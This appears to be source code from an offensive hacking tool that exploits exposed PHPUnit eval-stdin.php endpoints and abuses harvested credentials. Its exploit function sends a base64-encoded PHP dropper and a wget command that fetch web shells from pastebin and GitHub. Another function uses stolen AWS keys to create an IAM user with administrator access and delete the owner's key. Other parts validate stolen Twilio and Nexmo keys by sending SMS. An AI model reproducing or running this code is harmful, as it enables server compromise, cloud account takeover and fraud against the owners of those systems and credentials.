import requests,boto3,json
from colorama import Fore
from multiprocessing import Lock as lock
from twilio import *
from twilio.rest import Client
from iprange import twilio_t
from configparser import ConfigParser

config = ConfigParser()


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[0m'
    red = Fore.RED

def sparkpostmail():

  ip_listx = open("settings.ini", 'r').read()

  if "sparkpostmail=on" in ip_listx:
    sparkpostmail = "on"
    return sparkpostmail
  else:
    sparkpostmail = "off"
    return sparkpostmail
def and1():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "and1=on" in ip_listx:
    and1 = "on"
    return and1
  else:
    and1 = "off"
    return and1
def zimbra():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "zimbra=on" in ip_listx:
    zimbra = "on"
    return zimbra
  else:
    zimbra = "off"
    return zimbra

def relay():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "gsuite-relay=on" in ip_listx:
    relay = "on"
    return relay
  else:
    relay = "off"
    return relay

def sendinblue():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sendinblue=on" in ip_listx:
    sendinblue = "on"
    return sendinblue
  else:
    sendinblue = "off"
    return sendinblue

def mandrillapp():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mandrillapp=on" in ip_listx:
    mandrillapp = "on"
    return mandrillapp
  else:
    mandrillapp = "off"
    return mandrillapp

def zoho():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "zoho=on" in ip_listx:
    zoho = "on"
    return zoho
  else:
    zoho = "off"
    return zoho
def sendgrid():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sendgrid=on" in ip_listx:
    sendgrid = "on"
    return sendgrid
  else:
    sendgrid = "off"
    return sendgrid
def office365():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "office365=on" in ip_listx:
    office365 = "on"
    return office365
  else:
    office365 = "off"
    return office365
def mailgun():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mailgun=on" in ip_listx:
    mailgun = "on"
    return mailgun
  else:
    mailgun = "off"
    return mailgun

def phpunitshell():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "autoshell=on" in ip_listx:
    phpunitshell = "on"
    return phpunitshell
  else:
    phpunitshell = "off"
    return phpunitshell

def aws():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "aws=on" in ip_listx:
    aws = "on"
    return aws
  else:
    aws = "off"
    return aws
def twillio():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "twillio=on" in ip_listx:
    twillio = "on"
    return twillio
  else:
    twillio = "off"
    return twillio
  
def exploit(url):
  try:
    data = "<?php phpinfo(); ?>"
    text = requests.get(url, data=data, timeout=1, verify=False)
    urls = url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","")
    if "phpinfo()" in text.text:
      data2 = "<?php eval('?>'.base64_decode('PD9waHAgPz48P3BocApmdW5jdGlvbiBhZG1pbmVyKCR1cmwsICRpc2kpIHsKICAgICRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7CiAgICAkY2ggPSBjdXJsX2luaXQoKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOwogICAgcmV0dXJuIGN1cmxfZXhlYygkY2gpOwogICAgY3VybF9jbG9zZSgkY2gpOwogICAgZmNsb3NlKCRmcCk7CiAgICBvYl9mbHVzaCgpOwogICAgZmx1c2goKTsKfQppZiAoYWRtaW5lcigiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1pLZlhTdUJYIiwgImRldi5waHAiKSkgewogICAgZWNobyAiU3Vrc2VzIjsKfSBlbHNlIHsKICAgIGVjaG8gImZhaWwiOwp9Cj8+')); ?>"
      spawn = requests.get(url, data=data2, timeout=1, verify=False)
      if "Sukses" in spawn.text:
        print("[SHELL INFO] "+urls+" | \033[32;1mSHELL SUCCESS\033[0m")
        buildwrite = url.replace("eval-stdin.php","dev.php")+"\n"
        shellresult = open("Result/phpunit_shell_1.txt","a")
        shellresult.write(buildwrite)
        shellresult.close()
      else:
        print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"FAILED\033[0m")
    else:
      print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")
  except:
    print("[SHELL INFO] TRY METHOD 2..")
    try:
      koc = requests.get(urls + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", verify=False, timeout=1)
      if koc.status_code == 200:
        peylod = "<?php echo 'Con7ext#'.system('uname -a').'#'; ?>"
        peylod2 = "<?php echo 'ajg'.system('wget https://raw.githubusercontent.com/rinrequests/toolol/master/payload.php -O c.php'); ?>"
        ree = requests.post(urls + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=peylod, verify=False)
        if 'Con7ext' in ree.text:
          bo = requests.post(urls + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=peylod2, verify=False)
          cok = requests.get(urls +"/vendor/phpunit/phpunit/src/Util/PHP/c.php", verify=False)
          if cok.status_code == 200 and '>>' in cok.text:
            print("[SHELL INFO] "+urls+" | \033[32;1mSHELL SUCCESS\033[0m")
            shellresult = open("Result/phpunit_shell_2.txt","a")
            shellresult.write(urls+"/vendor/phpunit/phpunit/src/Util/PHP/c.php")
            shellresult.close()
          else:
            print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")
        else:
          print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")
      else:
        print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")
    except:
      print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")

def twilliocheck(url,acc_sid,acc_key,acc_from):
  account_sid = acc_sid
  auth_token = acc_key
  client = Client(account_sid, auth_token)
  account = client.api.accounts.create()
  
  if "Unable to create record: Authenticate" not in account.sid:
    print("TWILLIO VALID SEND API")
    balance = twilio_t.get_balance(acc_sid,acc_key)
    number = twilio_t.get_phone(acc_sid,acc_key)
    type = twilio_t.get_type(acc_sid,acc_key)
    bod ='test'
    nopetest = '+14303052705'
    send = twilio_t.send_sms(acc_sid,acc_key,bod,number,nopetest)
    if send == 'die':
        status = 'CANT SEND SMS TO US'
    else:
        status = 'LIVE'
    
    save = open('Result/valid_twillio.txt', 'a')
    build = 'URL: '+str(url)+'\nSTATUS : '+format(str(status))+'\nAccount SID : '+str(acc_sid)+'\nAuth Key: '+str(acc_key)+'\nBalance : '+format(str(balance))+'\nFROM: '+format(str(number))+'\nAccount Type : '+format(str(type))+'\n\n------------------------------------------------\n'
    save.write(build)
    save.close()

def NEXMO():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "NEXMO=on" in ip_listx:
    NEXMO = "on"
    return NEXMO
  else:
    NEXMO = "off"
    return NEXMO
  
def nexmosend(url,a,s):
    r = requests.get('https://rest.nexmo.com/sms/json?api_key='+str(a)+'&api_secret='+str(s)+'&to=+923117708953&text=test&from=TEST')
    Json = json.dumps(r.json())
    resp = json.loads(Json)
    test = resp['messages']
    try:
        balance = test[0]["remaining-balance"]
    except:
        balance = "Error"
    try:
        errorcode = test[0]["error-text"]
    except:
        errorcode = "UNKNOWN"

    if "Quota Exceeded - rejected" in errorcode:
        print(bcolors.WARNING+str(a)+" => "+bcolors.OKBLUE+"Quota Exceeded - rejected | Balance : "+str(balance))
    elif "Bad Credentials" in errorcode:
        print(bcolors.WARNING+str(a)+" => "+bcolors.FAIL+"Bad Credentials")
    elif "Error" not in balance:
        print(bcolors.WARNING+str(a)+" => "+bcolors.OKGREEN+"Valid | Balance : "+str(balance))
        build = 'API_KEY : '+str(a)+'\nAPI_SECRET : '+str(s)+'\nBALANCE : '+str(balance)+'\n\n'
        save = open('Result/valid_nexmo.txt', 'a') 
        save.write(build)
        save.close()
    else:
        print(bcolors.WARNING+str(a)+" => Cant Send to US | error code: "+str(errorcode))
        build = 'API_KEY : '+str(a)+'\nAPI_SECRET : '+str(s)+'\nBALANCE : '+str(balance)+'ERROR : '+str(errorcode)+'\n\n'
        save = open('Result/valid_nexmo.txt', 'a') 
        save.write(build)
        save.close()

def autocreateses(url,ACCESS_KEY,SECRET_KEY,REGION):
    try:
        UsernameLogin = "jSDSsajsnhjjjjjjwyyw"
        user = ACCESS_KEY
        keyacces = SECRET_KEY
        regionz = REGION
        client = boto3.client(
        'iam'
        ,aws_access_key_id=user
        ,aws_secret_access_key=keyacces
        ,region_name = regionz)
        data = "[O][ACCOUNT]{}|{}|{}".format(user,keyacces,regionz)
        with lock:
          print(data)
        Create_user = client.create_user(
        UserName=UsernameLogin,
        )
        with lock:
          print("succes create iam lets go to dashboard!")
        bitcg = f"User: {Create_user['User'] ['UserName']}"
        xxxxcc = f"User: {Create_user['User'] ['Arn']}"
        
        with lock:
          print(bitcg)
        with lock:
          print(xxxxcc)
        
        #keluan 'Arn': 'arn:aws:iam::320406895696:user/Kontolz'
        #debug mode create
        with lock:
          print(Create_user)
        #set konstanta pws 
        pws = "admajsd21334#1ejeg2shehhe"
        with lock:
          print("Username = " + UsernameLogin)
          print("create acces login for" + UsernameLogin)
        Buat = client.create_login_profile(
        Password=pws,
        PasswordResetRequired=False,
        UserName=UsernameLogin
        )
        with lock:
          print(Buat)
        
        #'LoginProfile': {'UserName': 'Kontolz', 'CreateDate':
        with lock:
          print("password:" + pws)
        with lock:
          print("give access  User to Admin")
        Admin = client.attach_user_policy(
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
        UserName=UsernameLogin,
        )
        xxx = url+"|"+UsernameLogin+"|"+pws+"|"+bitcg + "|" +  xxxxcc
        with lock:
          print(xxx)
        remover = str(xxx).replace('\r', '')
        with lock:
          print("Success crack.. save in imaccount.txt")
        simpan = open('Result/IamAccount.txt', 'a')
        simpan.write(remover+'\n\n')
        simpan.close()
        with lock:
          print(Admin)
        response = client.delete_access_key(
          AccessKeyId=user
        )
        with lock:
          print(response)
        with lock:
          print("succesful your key is privat only now !")
        with lock:
          print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.OKGREEN+"Success Create User")
    except Exception as e:
        with lock:
          print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.FAIL+"Failed Create User")
        pass

def EXOTEL():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "EXOTEL=on" in ip_listx:
    EXOTEL = "on"
    return EXOTEL
  else:
    EXOTEL = "off"
    return EXOTEL
def ONESIGNAL():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "ONESIGNAL=on" in ip_listx:
    ONESIGNAL = "on"
    return ONESIGNAL
  else:
    ONESIGNAL = "off"
    return ONESIGNAL

def TOKBOX():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "TOKBOX=on" in ip_listx:
    TOKBOX = "on"
    return TOKBOX
  else:
    TOKBOX = "off"
    return TOKBOX